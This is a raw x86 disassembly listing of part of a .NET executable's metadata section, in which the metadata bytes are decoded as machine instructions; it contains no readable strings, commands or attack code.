  404cea:	00 00                	add    %al,(%eax)
  404cec:	00 00                	add    %al,(%eax)
  404cee:	07                   	pop    %es
  404cef:	00 da                	add    %bl,%dl
  404cf1:	e1 00                	loope  0x404cf3
  404cf3:	1a 1d 00 00 01 06    	sbb    0x6010000,%bl
  404cf9:	2a 00                	sub    (%eax),%al
  404cfb:	00 42 53             	add    %al,0x53(%edx)
  404cfe:	4a                   	dec    %edx
  404cff:	42                   	inc    %edx
  404d00:	01 00                	add    %eax,(%eax)
  404d02:	01 00                	add    %eax,(%eax)
  404d04:	00 00                	add    %al,(%eax)
  404d06:	00 00                	add    %al,(%eax)
  404d08:	0c 00                	or     $0x0,%al
  404d0a:	00 00                	add    %al,(%eax)
  404d0c:	76 34                	jbe    0x404d42
  404d0e:	2e 30 2e             	xor    %ch,%cs:(%esi)
  404d11:	33 30                	xor    (%eax),%esi
  404d13:	33 31                	xor    (%ecx),%esi
  404d15:	39 00                	cmp    %eax,(%eax)
  404d17:	00 00                	add    %al,(%eax)
  404d19:	00 05 00 6c 00 00    	add    %al,0x6c00
  404d1f:	00 b4 15 00 00 23 7e 	add    %dh,0x7e230000(%ebp,%edx,1)
  404d26:	00 00                	add    %al,(%eax)
  404d28:	20 16                	and    %dl,(%esi)
  404d2a:	00 00                	add    %al,(%eax)
  404d2c:	20 1b                	and    %bl,(%ebx)
  404d2e:	00 00                	add    %al,(%eax)
  404d30:	23 53 74             	and    0x74(%ebx),%edx
  404d33:	72 69                	jb     0x404d9e
  404d35:	6e                   	outsb  %ds:(%esi),(%dx)
  404d36:	67 73 00             	addr16 jae 0x404d39
  404d39:	00 00                	add    %al,(%eax)
  404d3b:	00 40 31             	add    %al,0x31(%eax)
  404d3e:	00 00                	add    %al,(%eax)
  404d40:	bc 43 00 00 23       	mov    $0x23000043,%esp
  404d45:	55                   	push   %ebp
  404d46:	53                   	push   %ebx
  404d47:	00 fc                	add    %bh,%ah
  404d49:	74 00                	je     0x404d4b
  404d4b:	00 10                	add    %dl,(%eax)
  404d4d:	00 00                	add    %al,(%eax)
  404d4f:	00 23                	add    %ah,(%ebx)
  404d51:	47                   	inc    %edi
  404d52:	55                   	push   %ebp
  404d53:	49                   	dec    %ecx
  404d54:	44                   	inc    %esp
  404d55:	00 00                	add    %al,(%eax)
  404d57:	00 0c 75 00 00 e8 0b 	add    %cl,0xbe80000(,%esi,2)
  404d5e:	00 00                	add    %al,(%eax)
  404d60:	23 42 6c             	and    0x6c(%edx),%eax
  404d63:	6f                   	outsl  %ds:(%esi),(%dx)
  404d64:	62 00                	bound  %eax,(%eax)
  404d66:	00 00                	add    %al,(%eax)
  404d68:	00 00                	add    %al,(%eax)
  404d6a:	00 00                	add    %al,(%eax)
  404d6c:	02 00                	add    (%eax),%al
  404d6e:	00 01                	add    %al,(%ecx)
  404d70:	57                   	push   %edi
  404d71:	1f                   	pop    %ds
  404d72:	02 1e                	add    (%esi),%bl
  404d74:	09 0a                	or     %ecx,(%edx)
  404d76:	00 00                	add    %al,(%eax)
  404d78:	00 fa                	add    %bh,%dl
  404d7a:	01 33                	add    %esi,(%ebx)
  404d7c:	00 16                	add    %dl,(%esi)
  404d7e:	00 00                	add    %al,(%eax)
  404d80:	01 00                	add    %eax,(%eax)
  404d82:	00 00                	add    %al,(%eax)
  404d84:	86 00                	xchg   %al,(%eax)
  404d86:	00 00                	add    %al,(%eax)
  404d88:	15 00 00 00 6b       	adc    $0x6b000000,%eax
  404d8d:	00 00                	add    %al,(%eax)
  404d8f:	00 40 00             	add    %al,0x0(%eax)
  404d92:	00 00                	add    %al,(%eax)
  404d94:	3d 00 00 00 08       	cmp    $0x8000000,%eax
  404d99:	00 00                	add    %al,(%eax)
  404d9b:	00 09                	add    %cl,(%ecx)
  404d9d:	01 00                	add    %eax,(%eax)
  404d9f:	00 0a                	add    %cl,(%edx)
  404da1:	00 00                	add    %al,(%eax)
  404da3:	00 34 00             	add    %dh,(%eax,%eax,1)
  404da6:	00 00                	add    %al,(%eax)
  404da8:	18 00                	sbb    %al,(%eax)
  404daa:	00 00                	add    %al,(%eax)
  404dac:	0e                   	push   %cs
  404dad:	00 00                	add    %al,(%eax)
  404daf:	00 01                	add    %al,(%ecx)
  404db1:	00 00                	add    %al,(%eax)
  404db3:	00 0f                	add    %cl,(%edi)
  404db5:	00 00                	add    %al,(%eax)
  404db7:	00 01                	add    %al,(%ecx)
  404db9:	00 00                	add    %al,(%eax)
  404dbb:	00 01                	add    %al,(%ecx)
  404dbd:	00 00                	add    %al,(%eax)
  404dbf:	00 06                	add    %al,(%esi)
  404dc1:	00 00                	add    %al,(%eax)
  404dc3:	00 09                	add    %cl,(%ecx)
  404dc5:	00 00                	add    %al,(%eax)
  404dc7:	00 18                	add    %bl,(%eax)
  404dc9:	00 00                	add    %al,(%eax)
  404dcb:	00 00                	add    %al,(%eax)
  404dcd:	00 95 0b 01 00 00    	add    %dl,0x10b(%ebp)
  404dd3:	00 00                	add    %al,(%eax)
  404dd5:	00 06                	add    %al,(%esi)
  404dd7:	00 d2                	add    %dl,%dl
  404dd9:	0a b1 12 06 00 3d    	or     0x3d000612(%ecx),%dh
  404ddf:	0b b1 12 06 00 ca    	or     -0x35fff9ee(%ecx),%esi
  404de5:	09 6d 12             	or     %ebp,0x12(%ebp)
  404de8:	0f 00 d1             	lldt   %ecx
  404deb:	12 00                	adc    (%eax),%al
  404ded:	00 06                	add    %al,(%esi)
  404def:	00 3f                	add    %bh,(%edi)
  404df1:	0a df                	or     %bh,%bl
  404df3:	0b 06                	or     (%esi),%eax
  404df5:	00 24 0b             	add    %ah,(%ebx,%ecx,1)
  404df8:	3f                   	aas
  404df9:	0e                   	push   %cs
  404dfa:	06                   	push   %es
  404dfb:	00 b3 0a 3f 0e 06    	add    %dh,0x60e3f0a(%ebx)
  404e01:	00 70 0a             	add    %dh,0xa(%eax)
  404e04:	3f                   	aas
  404e05:	0e                   	push   %cs
  404e06:	06                   	push   %es
  404e07:	00 8d 0a 3f 0e 06    	add    %cl,0x60e3f0a(%ebp)
  404e0d:	00 f2                	add    %dh,%dl
  404e0f:	0a 3f                	or     (%edi),%bh
  404e11:	0e                   	push   %cs
  404e12:	06                   	push   %es
  404e13:	00 f0                	add    %dh,%al
  404e15:	09 3f                	or     %edi,(%edi)
  404e17:	0e                   	push   %cs
  404e18:	06                   	push   %es
  404e19:	00 97 09 b1 12 06    	add    %dl,0x612b109(%edi)
  404e1f:	00 51 0b             	add    %dl,0xb(%ecx)
  404e22:	ab                   	stos   %eax,%es:(%edi)
  404e23:	0d 06 00 75 15       	or     $0x15750006,%eax
  404e28:	ab                   	stos   %eax,%es:(%edi)
  404e29:	0d 06 00 b2 09       	or     $0x9b20006,%eax
  404e2e:	ab                   	stos   %eax,%es:(%edi)
  404e2f:	0d 06 00 49 16       	or     $0x16490006,%eax
  404e34:	ab                   	stos   %eax,%es:(%edi)
  404e35:	0d 06 00 0d 02       	or     $0x20d0006,%eax
  404e3a:	87 04 0a             	xchg   %eax,(%edx,%ecx,1)
  404e3d:	00 eb                	add    %ch,%bl
  404e3f:	0c ab                	or     $0xab,%al
  404e41:	0d 0a 00 2b 02       	or     $0x22b000a,%eax
  404e46:	fb                   	sti
  404e47:	12 0a                	adc    (%edx),%cl
  404e49:	00 49 15             	add    %cl,0x15(%ecx)
  404e4c:	6d                   	insl   (%dx),%es:(%edi)
  404e4d:	12 0a                	adc    (%edx),%cl
  404e4f:	00 fa                	add    %bh,%dl
  404e51:	10 50 16             	adc    %dl,0x16(%eax)
  404e54:	06                   	push   %es
  404e55:	00 bf 07 ab 0d 06    	add    %bh,0x60dab07(%edi)
  404e5b:	00 07                	add    %al,(%edi)
  404e5d:	0a b1 12 06 00 22    	or     0x22000612(%ecx),%dh
  404e63:	0a 6d 12             	or     0x12(%ebp),%ch
  404e66:	06                   	push   %es
  404e67:	00 7c 07 b1          	add    %bh,-0x4f(%edi,%eax,1)
  404e6b:	12 06                	adc    (%esi),%al
  404e6d:	00 36                	add    %dh,(%esi)
  404e6f:	01 b1 12 0a 00 0c    	add    %esi,0xc000a12(%ecx)
  404e75:	19 50 16             	sbb    %edx,0x16(%eax)
  404e78:	06                   	push   %es
  404e79:	00 4e 11             	add    %cl,0x11(%esi)
  404e7c:	b1 12                	mov    $0x12,%cl
  404e7e:	06                   	push   %es
  404e7f:	00 ee                	add    %ch,%dh
  404e81:	0e                   	push   %cs
  404e82:	ab                   	stos   %eax,%es:(%edi)
  404e83:	0d 06 00 1e 10       	or     $0x101e0006,%eax
  404e88:	b1 12                	mov    $0x12,%cl
  404e8a:	0a 00                	or     (%eax),%al
  404e8c:	53                   	push   %ebx
  404e8d:	18 50 16             	sbb    %dl,0x16(%eax)
  404e90:	0a 00                	or     (%eax),%al
  404e92:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404e93:	08 50 16             	or     %dl,0x16(%eax)
  404e96:	06                   	push   %es
  404e97:	00 58 0a             	add    %bl,0xa(%eax)
  404e9a:	6d                   	insl   (%dx),%es:(%edi)
  404e9b:	12 06                	adc    (%esi),%al
  404e9d:	00 64 06 ab          	add    %ah,-0x55(%esi,%eax,1)
  404ea1:	0d 06 00 d3 0d       	or     $0xdd30006,%eax
  404ea6:	ba 0b 0e 00 70       	mov    $0x70000e0b,%edx
  404eab:	11 de                	adc    %ebx,%esi
  404ead:	1a 0e                	sbb    (%esi),%cl
  404eaf:	00 83 17 de 13 06    	add    %al,0x613de17(%ebx)
  404eb5:	00 ec                	add    %ch,%ah
  404eb7:	0d ab 0d 06 00       	or     $0x60dab,%eax
  404ebc:	e8 0f e0 19 12       	call   0x125a2ed0
  404ec1:	00 02                	add    %al,(%edx)
  404ec3:	10 e0                	adc    %ah,%al
  404ec5:	19 06                	sbb    %eax,(%esi)
  404ec7:	00 4d 05             	add    %cl,0x5(%ebp)
  404eca:	ab                   	stos   %eax,%es:(%edi)
  404ecb:	0d 06 00 44 01       	or     $0x1440006,%eax
  404ed0:	87 04 ab             	xchg   %eax,(%ebx,%ebp,4)
  404ed3:	00 f5                	add    %dh,%ch
  404ed5:	11 00                	adc    %eax,(%eax)
  404ed7:	00 0e                	add    %cl,(%esi)
  404ed9:	00 8b 17 de 13 06    	add    %cl,0x613de17(%ebx)
  404edf:	00 08                	add    %cl,(%eax)
  404ee1:	0d c0 13 0e 00       	or     $0xe13c0,%eax
  404ee6:	7c 13                	jl     0x404efb
  404ee8:	a0 15 0e 00 89       	mov    0x89000e15,%al
  404eed:	13 a0 15 06 00 02    	adc    0x2000615(%eax),%esp
  404ef3:	01 ab 0d 06 00 d8    	add    %ebp,-0x27fff9f3(%ebx)
  404ef9:	11 ab 0d 0e 00 b3    	adc    %ebp,-0x4cfff1f3(%ebx)
  404eff:	0e                   	push   %cs
  404f00:	59                   	pop    %ecx
  404f01:	14 06                	adc    $0x6,%al
  404f03:	00 06                	add    %al,(%esi)
  404f05:	02 ab 0d 16 00 dc    	add    -0x23ffe9f3(%ebx),%ch
  404f0b:	16                   	push   %ss
  404f0c:	ac                   	lods   %ds:(%esi),%al
  404f0d:	0f 06                	clts
  404f0f:	00 35 10 b1 12 0a    	add    %dh,0xa12b110
  404f15:	00 51 15             	add    %dl,0x15(%ecx)
  404f18:	50                   	push   %eax
  404f19:	16                   	push   %ss
  404f1a:	06                   	push   %es
  404f1b:	00 08                	add    %cl,(%eax)
  404f1d:	0e                   	push   %cs
  404f1e:	ba 0b 06 00 8a       	mov    $0x8a00060b,%edx
  404f23:	0d 53 04 16 00       	or     $0x160453,%eax
  404f28:	f1                   	int1
  404f29:	16                   	push   %ss
  404f2a:	ac                   	lods   %ds:(%esi),%al
  404f2b:	0f 06                	clts
  404f2d:	00 0d 01 87 04 16    	add    %cl,0x16048701
  404f33:	00 88 05 ac 0f 0e    	add    %cl,0xe0fac05(%eax)
  404f39:	00 dd                	add    %bl,%ch
  404f3b:	0f de 13             	pmaxub (%ebx),%mm2
  404f3e:	06                   	push   %es
  404f3f:	00 5d 07             	add    %bl,0x7(%ebp)
  404f42:	ab                   	stos   %eax,%es:(%edi)
  404f43:	0d 1a 00 d9 08       	or     $0x8d9001a,%eax
  404f48:	8b 03                	mov    (%ebx),%eax
  404f4a:	0a 00                	or     (%eax),%al
  404f4c:	ef                   	out    %eax,(%dx)
  404f4d:	07                   	pop    %es
  404f4e:	fb                   	sti
  404f4f:	12 1a                	adc    (%edx),%bl
  404f51:	00 2b                	add    %ch,(%ebx)
  404f53:	11 64 0f 1a          	adc    %esp,0x1a(%edi,%ecx,1)
  404f57:	00 2c 12             	add    %ch,(%edx,%edx,1)
  404f5a:	48                   	dec    %eax
  404f5b:	0c 1a                	or     $0x1a,%al
  404f5d:	00 e6                	add    %ah,%dh
  404f5f:	0d b6 1a 1a 00       	or     $0x1a1ab6,%eax
  404f64:	00 12                	add    %dl,(%edx)
  404f66:	8b 03                	mov    (%ebx),%eax
  404f68:	1a 00                	sbb    (%eax),%al
  404f6a:	93                   	xchg   %eax,%ebx
  404f6b:	10 87 0c 1a 00 a8    	adc    %al,-0x57ffe5f4(%edi)
  404f71:	06                   	push   %es
  404f72:	70 03                	jo     0x404f77
  404f74:	1a 00                	sbb    (%eax),%al
  404f76:	bd 14 64 0f 1a       	mov    $0x1a0f6414,%ebp
  404f7b:	00 45 12             	add    %al,0x12(%ebp)
  404f7e:	04 15                	add    $0x15,%al
  404f80:	1a 00                	sbb    (%eax),%al
  404f82:	98                   	cwtl
  404f83:	11 64 0f 1a          	adc    %esp,0x1a(%edi,%ecx,1)
  404f87:	00 fd                	add    %bh,%ch
  404f89:	19 27                	sbb    %esp,(%edi)
  404f8b:	15 1a 00 50 0f       	adc    $0xf50001a,%eax
  404f90:	80 12 1a             	adcb   $0x1a,(%edx)
  404f93:	00 b3 05 5c 01 1a    	add    %dh,0x1a015c05(%ebx)
  404f99:	00 1e                	add    %bl,(%esi)
  404f9b:	08 80 12 1a 00 d5    	or     %al,-0x2affe5ee(%eax)
  404fa1:	14 9a                	adc    $0x9a,%al
  404fa3:	14 1a                	adc    $0x1a,%al
  404fa5:	00 34 06             	add    %dh,(%esi,%eax,1)
  404fa8:	5c                   	pop    %esp
  404fa9:	01 1a                	add    %ebx,(%edx)
  404fab:	00 c0                	add    %al,%al
  404fad:	05 5c 01 1a 00       	add    $0x1a015c,%eax
  404fb2:	e3 07                	jecxz  0x404fbb
  404fb4:	9b                   	fwait
  404fb5:	12 1a                	adc    (%edx),%bl
  404fb7:	00 3a                	add    %bh,(%edx)
  404fb9:	1a 9b 12 06 00 84    	sbb    -0x7bfff9ee(%ebx),%bl
  404fbf:	0d 53 04 06 00       	or     $0x60453,%eax
  404fc4:	5b                   	pop    %ebx
  404fc5:	0b ab 0d 06 00 82    	or     -0x7dfff9f3(%ebx),%ebp
  404fcb:	1a 92 01 06 00 37    	sbb    0x37000601(%edx),%dl
  404fd1:	0c ab                	or     $0xab,%al
  404fd3:	0d 06 00 a0 06       	or     $0x6a00006,%eax
  404fd8:	ab                   	stos   %eax,%es:(%edi)
  404fd9:	0d 06 00 80 06       	or     $0x6800006,%eax
  404fde:	53                   	push   %ebx
  404fdf:	04 06                	add    $0x6,%al
  404fe1:	00 a4 01 ab 0d 06 00 	add    %ah,0x60dab(%ecx,%eax,1)
  404fe8:	a1 0c 53 04 06       	mov    0x604530c,%eax
  404fed:	00 e6                	add    %ah,%dh
  404fef:	0e                   	push   %cs
  404ff0:	ab                   	stos   %eax,%es:(%edi)
  404ff1:	0d 06 00 f5 17       	or     $0x17f50006,%eax
  404ff6:	ab                   	stos   %eax,%es:(%edi)
  404ff7:	0d 0a 00 2b 19       	or     $0x192b000a,%eax
  404ffc:	2e 14 06             	cs adc $0x6,%al
  404fff:	00 66 12             	add    %ah,0x12(%esi)
  405002:	ab                   	stos   %eax,%es:(%edi)
  405003:	0d 0a 00 39 0f       	or     $0xf39000a,%eax
  405008:	6d                   	insl   (%dx),%es:(%edi)
  405009:	12 06                	adc    (%esi),%al
  40500b:	00 e5                	add    %ah,%ch
  40500d:	16                   	push   %ss
  40500e:	ab                   	stos   %eax,%es:(%edi)
  40500f:	0d 06 00 c8 0f       	or     $0xfc80006,%eax
  405014:	ab                   	stos   %eax,%es:(%edi)
  405015:	0d 12 00 59 06       	or     $0x6590012,%eax
  40501a:	bc 0f 0a 00 62       	mov    $0x62000a0f,%esp
  40501f:	0e                   	push   %cs
  405020:	50                   	push   %eax
  405021:	16                   	push   %ss
  405022:	0a 00                	or     (%eax),%al
  405024:	ab                   	stos   %eax,%es:(%edi)
  405025:	1a 50 16             	sbb    0x16(%eax),%dl
  405028:	06                   	push   %es
  405029:	00 c5                	add    %al,%ch
  40502b:	0d e0 19 0e 00       	or     $0xe19e0,%eax
  405030:	e9 10 de 1a 0e       	jmp    0xe5b2e45
  405035:	00 22                	add    %ah,(%edx)
  405037:	01 a0 15 06 00 20    	add    %esp,0x20000615(%eax)
  40503d:	0f 3f                	(bad)
  40503f:	0e                   	push   %cs
  405040:	0a 00                	or     (%eax),%al
  405042:	ef                   	out    %eax,(%dx)
  405043:	06                   	push   %es
  405044:	fb                   	sti
  405045:	12 0a                	adc    (%edx),%cl
  405047:	00 31                	add    %dh,(%ecx)
  405049:	0e                   	push   %cs
  40504a:	fb                   	sti
  40504b:	12 0a                	adc    (%edx),%cl
  40504d:	00 72 13             	add    %dh,0x13(%edx)
  405050:	fb                   	sti
  405051:	12 1a                	adc    (%edx),%bl
  405053:	00 1b                	add    %bl,(%ebx)
  405055:	12 48 0c             	adc    0xc(%eax),%cl
  405058:	1a 00                	sbb    (%eax),%al
  40505a:	8e 14 e0             	mov    (%eax,%eiz,8),%ss
  40505d:	12 1a                	adc    (%edx),%bl
  40505f:	00 1e                	add    %bl,(%esi)
  405061:	07                   	pop    %es
  405062:	70 03                	jo     0x405067
  405064:	1a 00                	sbb    (%eax),%al
  405066:	1f                   	pop    %ds
  405067:	14 70                	adc    $0x70,%al
  405069:	03 1a                	add    (%edx),%ebx
  40506b:	00 b4 10 5c 01 1a 00 	add    %dh,0x1a015c(%eax,%edx,1)
  405072:	07                   	pop    %es
  405073:	04 70                	add    $0x70,%al
  405075:	03 1a                	add    (%edx),%ebx
  405077:	00 fb                	add    %bh,%bl
  405079:	05 70 03 1a 00       	add    $0x1a0370,%eax
  40507e:	c2 15 70             	ret    $0x7015
  405081:	03 1a                	add    (%edx),%ebx
  405083:	00 12                	add    %dl,(%edx)
  405085:	1a 64 0f 1a          	sbb    0x1a(%edi,%ecx,1),%ah
  405089:	00 24 1a             	add    %ah,(%edx,%ebx,1)
  40508c:	9b                   	fwait
  40508d:	12 1a                	adc    (%edx),%bl
  40508f:	00 45 16             	add    %al,0x16(%ebp)
  405092:	5c                   	pop    %esp
  405093:	01 1a                	add    %ebx,(%edx)
  405095:	00 a6 0e 4b 0d 1a    	add    %ah,0x1a0d4b0e(%esi)
  40509b:	00 63 1a             	add    %ah,0x1a(%ebx)
  40509e:	9b                   	fwait
  40509f:	12 06                	adc    (%esi),%al
  4050a1:	00 50 13             	add    %dl,0x13(%eax)
  4050a4:	fb                   	sti
  4050a5:	12 06                	adc    (%esi),%al
  4050a7:	00 1b                	add    %bl,(%ebx)
  4050a9:	01 c0                	add    %eax,%eax
  4050ab:	13 06                	adc    (%esi),%eax
  4050ad:	00 d6                	add    %dl,%dh
  4050af:	0b 00                	or     (%eax),%eax
  4050b1:	19 16                	sbb    %edx,(%esi)
  4050b3:	00 b1 06 ac 0f 0e    	add    %dh,0xe0fac06(%ecx)
  4050b9:	00 49 08             	add    %cl,0x8(%ecx)
  4050bc:	a0 15 0e 00 bf       	mov    0xbf000e15,%al
  4050c1:	16                   	push   %ss
  4050c2:	94                   	xchg   %eax,%esp
  4050c3:	0f 0e                	femms
  4050c5:	00 bd 18 94 0f 0a    	add    %bh,0xa0f9418(%ebp)
  4050cb:	00 2e                	add    %ch,(%esi)
  4050cd:	17                   	pop    %ss
  4050ce:	50                   	push   %eax
  4050cf:	16                   	push   %ss
  4050d0:	0e                   	push   %cs
  4050d1:	00 35 08 94 0f 16    	add    %dh,0x160f9408
  4050d7:	00 10                	add    %dl,(%eax)
  4050d9:	11 ac 0f 0e 00 b3 08 	adc    %ebp,0x8b3000e(%edi,%ecx,1)
  4050e0:	94                   	xchg   %eax,%esp
  4050e1:	0f 16 00             	movhps (%eax),%xmm0
  4050e4:	23 14 ac             	and    (%esp,%ebp,4),%edx
  4050e7:	0f 16 00             	movhps (%eax),%xmm0
  4050ea:	ea 05 ac 0f 16 00 4d 	ljmp   $0x4d00,$0x160fac05
  4050f1:	14 ac                	adc    $0xac,%al
  4050f3:	0f 0e                	femms
  4050f5:	00 51 0e             	add    %dl,0xe(%ecx)
  4050f8:	94                   	xchg   %eax,%esp
  4050f9:	0f 00 00             	sldt   (%eax)
  4050fc:	00 00                	add    %al,(%eax)
  4050fe:	dd 03                	fldl   (%ebx)
  405100:	00 00                	add    %al,(%eax)
  405102:	00 00                	add    %al,(%eax)
  405104:	01 00                	add    %eax,(%eax)
  405106:	01 00                	add    %eax,(%eax)
  405108:	00 01                	add    %al,(%ecx)
  40510a:	10 00                	adc    %al,(%eax)
  40510c:	85 09                	test   %ecx,(%ecx)
  40510e:	a9 13 35 00 01       	test   $0x1003513,%eax
  405113:	00 01                	add    %al,(%ecx)
  405115:	00 00                	add    %al,(%eax)
  405117:	01 10                	add    %edx,(%eax)
  405119:	00 de                	add    %bl,%dh
  40511b:	09 b1 12 35 00 01    	or     %esi,0x1003512(%ecx)
  405121:	00 02                	add    %al,(%edx)
  405123:	00 00                	add    %al,(%eax)
  405125:	01 10                	add    %edx,(%eax)
  405127:	00 0b                	add    %cl,(%ebx)
  405129:	0b b1 12 35 00 02    	or     0x2003512(%ecx),%esi
  40512f:	00 04 00             	add    %al,(%eax,%eax,1)
  405132:	00 00                	add    %al,(%eax)
  405134:	10 00                	adc    %al,(%eax)
  405136:	91                   	xchg   %eax,%ecx
  405137:	0d f9 15 41 00       	or     $0x4115f9,%eax
  40513c:	03 00                	add    (%eax),%eax
  40513e:	05 00 81 01 10       	add    $0x10018100,%eax
  405143:	00 d9                	add    %bl,%cl
  405145:	10 f9                	adc    %bh,%cl
  405147:	15 41 00 03 00       	adc    $0x30041,%eax
  40514c:	08 00                	or     %al,(%eax)
  40514e:	00 00                	add    %al,(%eax)
  405150:	10 00                	adc    %al,(%eax)
  405152:	1b 11                	sbb    (%ecx),%edx
  405154:	97                   	xchg   %eax,%edi
  405155:	1a 41 00             	sbb    0x0(%ecx),%al
  405158:	05 00 09 00 00       	add    $0x900,%eax
  40515d:	00 10                	add    %dl,(%eax)
  40515f:	00 69 10             	add    %ch,0x10(%ecx)
  405162:	97                   	xchg   %eax,%edi
  405163:	1a 41 00             	sbb    0x0(%ecx),%al
  405166:	05 00 0b 00 81       	add    $0x81000b00,%eax
  40516b:	01 10                	add    %edx,(%eax)
  40516d:	00 9e 10 97 1a 41    	add    %bl,0x411a9710(%esi)
  405173:	00 0a                	add    %cl,(%edx)
  405175:	00 0f                	add    %cl,(%edi)
  405177:	00 00                	add    %al,(%eax)
  405179:	00 10                	add    %dl,(%eax)
  40517b:	00 65 11             	add    %ah,0x11(%ebp)
  40517e:	f0 14 41             	lock adc $0x41,%al
  405181:	00 0d 00 11 00 00    	add    %cl,0x1100
  405187:	00 10                	add    %dl,(%eax)
  405189:	00 0b                	add    %cl,(%ebx)
  40518b:	1b f1                	sbb    %ecx,%esi
  40518d:	1a 41 00             	sbb    0x0(%ecx),%al
  405190:	0f 00 14 00          	lldt   (%eax,%eax,1)
  405194:	00 00                	add    %al,(%eax)
  405196:	10 00                	adc    %al,(%eax)
  405198:	c8 10 f8 13          	enter  $0xf810,$0x13
  40519c:	41                   	inc    %ecx
  40519d:	00 23                	add    %ah,(%ebx)
  40519f:	00 20                	add    %ah,(%eax)
  4051a1:	00 03                	add    %al,(%ebx)
  4051a3:	21 10                	and    %edx,(%eax)
  4051a5:	00 78 04             	add    %bh,0x4(%eax)
  4051a8:	00 00                	add    %al,(%eax)
  4051aa:	41                   	inc    %ecx
  4051ab:	00 25 00 26 00 03    	add    %ah,0x3002600
  4051b1:	01 10                	add    %edx,(%eax)
  4051b3:	00 81 02 00 00 41    	add    %al,0x41000002(%ecx)
  4051b9:	00 26                	add    %ah,(%esi)
  4051bb:	00 29                	add    %ch,(%ecx)
  4051bd:	00 03                	add    %al,(%ebx)
  4051bf:	01 10                	add    %edx,(%eax)
  4051c1:	00 d9                	add    %bl,%cl
  4051c3:	04 00                	add    $0x0,%al
  4051c5:	00 41 00             	add    %al,0x0(%ecx)
  4051c8:	30 00                	xor    %al,(%eax)
  4051ca:	2c 00                	sub    $0x0,%al
  4051cc:	03 21                	add    (%ecx),%esp
  4051ce:	10 00                	adc    %al,(%eax)
  4051d0:	78 04                	js     0x4051d6
  4051d2:	00 00                	add    %al,(%eax)
  4051d4:	41                   	inc    %ecx
  4051d5:	00 36                	add    %dh,(%esi)
  4051d7:	00 2f                	add    %ch,(%edi)
  4051d9:	00 03                	add    %al,(%ebx)
  4051db:	01 10                	add    %edx,(%eax)
  4051dd:	00 d8                	add    %bl,%al
  4051df:	02 00                	add    (%eax),%al
  4051e1:	00 41 00             	add    %al,0x0(%ecx)
  4051e4:	38 00                	cmp    %al,(%eax)
  4051e6:	32 00                	xor    (%eax),%al
  4051e8:	03 01                	add    (%ecx),%eax
  4051ea:	10 00                	adc    %al,(%eax)
  4051ec:	22 03                	and    (%ebx),%al
  4051ee:	00 00                	add    %al,(%eax)
  4051f0:	41                   	inc    %ecx
  4051f1:	00 40 00             	add    %al,0x0(%eax)
  4051f4:	35 00 03 01 10       	xor    $0x10010300,%eax
  4051f9:	00 3c 03             	add    %bh,(%ebx,%eax,1)
  4051fc:	00 00                	add    %al,(%eax)
  4051fe:	41                   	inc    %ecx
  4051ff:	00 4b 00             	add    %cl,0x0(%ebx)
  405202:	38 00                	cmp    %al,(%eax)
  405204:	03 01                	add    (%ecx),%eax
  405206:	10 00                	adc    %al,(%eax)
  405208:	a1 03 00 00 41       	mov    0x41000003,%eax
  40520d:	00 5f 00             	add    %bl,0x0(%edi)
  405210:	3b 00                	cmp    (%eax),%eax
  405212:	03 01                	add    (%ecx),%eax
  405214:	10 00                	adc    %al,(%eax)
  405216:	1f                   	pop    %ds
  405217:	00 00                	add    %al,(%eax)
  405219:	00 41 00             	add    %al,0x0(%ecx)
  40521c:	65 00 3e             	add    %bh,%gs:(%esi)
  40521f:	00 26                	add    %ah,(%esi)
  405221:	00 64 13 a8          	add    %ah,-0x58(%ebx,%edx,1)
  405225:	07                   	pop    %es
  405226:	26 00 b5 0b ac 07 36 	add    %dh,%es:0x3607ac0b(%ebp)
  40522d:	00 52 09             	add    %dl,0x9(%edx)
  405230:	c5 00                	lds    (%eax),%eax
  405232:	36 00 37             	add    %dh,%ss:(%edi)
  405235:	09 c5                	or     %eax,%ebp
  405237:	00 56 80             	add    %dl,-0x80(%esi)
  40523a:	e6 03                	out    %al,$0x3
  40523c:	af                   	scas   %es:(%edi),%eax
  40523d:	07                   	pop    %es
  40523e:	56                   	push   %esi
  40523f:	80 14 04 af          	adcb   $0xaf,(%esp,%eax,1)
  405243:	07                   	pop    %es
  405244:	01 00                	add    %eax,(%eax)
  405246:	16                   	push   %ss
  405247:	05 af 07 01 00       	add    $0x107af,%eax
  40524c:	3a 0d c5 00 51 80    	cmp    0x805100c5,%cl
  405252:	4a                   	dec    %edx
  405253:	07                   	pop    %es
  405254:	c5 00                	lds    (%eax),%eax
  405256:	31 00                	xor    %eax,(%eax)
  405258:	9d                   	popf
  405259:	0c c5                	or     $0xc5,%al
  40525b:	00 31                	add    %dh,(%ecx)
  40525d:	00 70 06             	add    %dh,0x6(%eax)
  405260:	c5 00                	lds    (%eax),%eax
  405262:	31 00                	xor    %eax,(%eax)
  405264:	15 00 c5 00 06       	adc    $0x600c500,%eax
  405269:	00 07                	add    %al,(%edi)
  40526b:	11 b2 07 06 00 66    	adc    %esi,0x66000607(%edx)
  405271:	04 a8                	add    $0xa8,%al
  405273:	07                   	pop    %es
  405274:	21 00                	and    %eax,(%eax)
  405276:	ff 0c b6             	decl   (%esi,%esi,4)
  405279:	07                   	pop    %es
  40527a:	21 00                	and    %eax,(%eax)
  40527c:	7c 11                	jl     0x40528f
  40527e:	bb 07 01 00 72       	mov    $0x72000107,%ebx
  405283:	17                   	pop    %ss
  405284:	c0 07 01             	rolb   $0x1,(%edi)
  405287:	00 86 10 c5 07 01    	add    %al,0x107c510(%esi)
  40528d:	00 7c 0f c9          	add    %bh,-0x37(%edi,%ecx,1)
  405291:	07                   	pop    %es
  405292:	21 00                	and    %eax,(%eax)
  405294:	fc                   	cld
  405295:	04 a8                	add    $0xa8,%al
  405297:	07                   	pop    %es
  405298:	21 00                	and    %eax,(%eax)
  40529a:	8a 00                	mov    (%eax),%al
  40529c:	c5 00                	lds    (%eax),%eax
  40529e:	21 00                	and    %eax,(%eax)
  4052a0:	fc                   	cld
  4052a1:	02 c5                	add    %ch,%al
  4052a3:	00 21                	add    %ah,(%ecx)
  4052a5:	00 c0                	add    %al,%al
  4052a7:	06                   	push   %es
  4052a8:	c5 00                	lds    (%eax),%eax
  4052aa:	21 00                	and    %eax,(%eax)
  4052ac:	96                   	xchg   %eax,%esi
  4052ad:	00 af 07 21 00 aa    	add    %ch,-0x55ffdef9(%edi)
  4052b3:	01 af 07 21 00 a0    	add    %ebp,-0x5fffdef9(%edi)
  4052b9:	00 af 07 21 00 b4    	add    %ch,-0x4bffdef9(%edi)
  4052bf:	01 af 07 21 00 4b    	add    %ebp,0x4b002107(%edi)
